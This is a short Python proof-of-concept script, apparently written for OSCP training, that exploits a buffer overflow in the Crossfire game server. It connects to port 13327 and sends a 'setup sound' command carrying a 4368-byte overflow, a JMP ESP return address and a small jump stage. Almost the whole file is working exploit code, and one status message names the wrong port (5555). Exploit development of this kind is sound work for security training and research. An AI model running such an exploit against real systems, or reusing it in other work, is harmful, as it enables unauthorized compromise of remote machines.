#!/usr/bin/env python3
"""
Exploit development code for OSCP Crossfire simple buffer overflow. 
"""

__author__="Teller Junak"
__version__="0.1.0"
__license__="MIT"

import socket, argparse

def main(args):
	""" Main entry point of the app """

	# Create socket object. Defaults are AF_INET and SOCK_STREAM. No need to specify.
	s = socket.socket()
	s.settimeout(10)

	# Create buffer string. OFFSET at: 0x46367046 which is byte 4368
	offset = b'A'*4368
	eip = b'\x96\x45\x13\x08'  # 0x08134596 this is a JMP ESP address
	shell = b'\x83\xc0\x0c\xff\xe0\x90\x90'  #83c00c = add eax,btye +0xc (12 bytes) > JMP EAX
	buffer = offset + eip + shell

	# Connect to remote target and print response
	print(f"[*] Connecting to {args.target} on port 13327")
	s.connect((args.target,13327))
	repr(s.recv(1024))

	# Send 'setup sound' command with 4379-byte buffer. Note byte-like string handling--b''
	print(f'[*] Sending "setup sound" command with buffer of length {len(buffer)} to {args.target}:5555')
	s.send(b'\x11(setup sound ' + buffer + b'\x90\x00')

	print('[?] Did the application crash??')
	s.close()

if __name__=="__main__":
	
	parser = argparse.ArgumentParser(description="Crossfire Offset POC")
	parser.add_argument("target", type=str, help="Required Target IPv4 Address") #required 'victim' IP address arg
	args = parser.parse_args()

	main(args)